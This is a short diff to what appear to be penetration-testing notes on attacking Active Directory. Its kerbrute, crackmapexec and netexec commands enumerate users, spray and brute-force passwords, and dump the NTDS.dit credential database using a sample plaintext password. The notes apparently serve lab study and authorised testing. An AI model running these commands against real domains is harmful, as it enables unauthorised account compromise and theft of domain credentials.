@@ -79,10 +79,11 @@ Target: Domain:interactive=SRV01\mcharles
 C:\Windows\NTDS\ntds.dit
 
 1) ./username-anarchy -i <NAMES_PATH>
+crackmapexec smb <IP> ( Find Domain Name )
 Kerbrute: Kerberos TGT requests Event ID 4768
 kerbrute userenum -d company.local --dc 10.10.10.5 users.txt
-kerbrute passwordspray -d company.local users.txt Winter2025!
-kerbrute bruteuser -d company.local passwords.txt ali.aliyev
+kerbrute passwordspray -d company.local --dc <IP> users.txt Winter2025!
+kerbrute bruteuser -d company.local --dc <IP> passwords.txt ali.aliyev
 
 netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
 
